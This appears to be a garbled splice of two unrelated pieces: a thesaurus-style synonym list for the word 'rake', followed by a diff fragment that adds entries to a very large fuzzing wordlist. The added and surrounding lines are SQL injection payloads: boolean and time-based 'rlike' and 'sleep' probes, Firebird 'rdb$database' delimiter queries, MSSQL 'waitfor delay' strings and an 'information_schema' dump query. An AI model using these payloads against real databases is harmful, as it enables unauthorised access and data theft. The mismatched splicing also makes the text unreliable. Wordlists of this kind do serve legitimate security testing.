 rake,casanova,don juan,lothario,aim at,angularity,ascend,backset,bank,barrage,be promiscuous,beat,blast,blitz,bombard,bounder,bring up,cad,cannon,cannonade,cant,card,careen,chase women,clear,climb,cog,coin money,collect,comb,commence firing,commit adultery,crag,cultivate,culture,curry,cut,debauch,debauchee,decline,delve,descend,dig,dig up,dip,dissipate,draw together,dredge up,dress,drop,eliminate,enfilade,fall,fall away,fall off,fallow,fang,fertilize,find,fire a volley,fire at,fire upon,force,fornicate,fusillade,gallant,gather,gather in,gather together,gather up,gay deceiver,gay dog,go downhill,go uphill,grade,grate,graze,grovel,gruel,hackle,harrow,hatchel,heckle,hoe,inclination,incline,jag,keel,lady-killer,lath,lean,leaning,leaning tower,lecher,libertine,list,look all over,look everywhere,lover-boy,make,masher,mere shadow,mortar,mulch,open fire,open up on,paper,peak,pecten,pepper,philander,philanderer,pick up,pitch,playboy,plow,pop at,probe,prodigal,profligate,projection,prune,pull in,rail,raise,rake out,rake up,rakehell,ransack,rascal,ratchet,recall,remove,resurrect,resuscitate,retreat,rifle,rip,rise,roue,rounder,rummage,sawtooth,scoundrel,scour,scrape,scrape together,scrape up,scratch,screen,search,search high heaven,shadow,shake,shake down,shaving,shell,shelve,shoot,shoot at,sidle,sift out,skeleton,skirt chaser,slant,slat,sleep around,slip,slope,snag,snaggle,snipe,snipe at,soup,spade,spire,splinter,sprocket,spur,steeple,strafe,streak,swag,sway,swing,swinger,take aim at,thin,thin out,till,till the soil,tilt,tip,tooth,torpedo,toss,tower of pisa,turn inside out,turn upside down,unearth,uprise,vein,voluptuary,wafer,walking phallus,wallow,wanton,weed,weed out,whore,wolf,woman chaser,womanize,womanizer,work,zero in on
@@ -133277,6 +133443,9 @@ rlevelselect.xml
 rlexec
 rlike (select (case when (4346=4346) then 0x61646d696e else 0x28 end)) and 'txws'='
 rlike (select (case when (4346=4347) then 0x61646d696e else 0x28 end)) and 'txws'='
+rlike (select (case when ([randnum]=[randnum]) then [origvalue] else 0x28 end))
+rlike (select [randnum] from (select(sleep([sleeptime])))[randstr])
+rlike sleep([sleeptime])
 rltyexec
 rm-authorities.delete.desc.xml
 rm-drop-limiter.conf
@@ -136165,6 +136334,8 @@ selbstschalter
 selbstverwalter
 select
 select    generate a list of items
+select '[delimiter_start]'||(case [randnum] when [randnum] then 1 else 0 end)||'[delimiter_stop]' from rdb$database
+select '[delimiter_start]'||(case when ([randnum]=[randnum]) then 1 else 0 end)||'[delimiter_stop]'
 select (grid).xml
 select * from information_schema.tables--
 select * from master..sysserverse
@@ -173872,6 +174043,7 @@ waitfor delay '00:02'
 waitfor delay '00:02' --
 waitfor delay '0:0:20' --
 waitfor delay '0:0:20' /*
+waitfor delay '0:0:[sleeptime]'
 waitfor delay '0:0:__time__' --
 waitfor delay '0:0:__time__' /*
 waitfor delay \'00:02\'
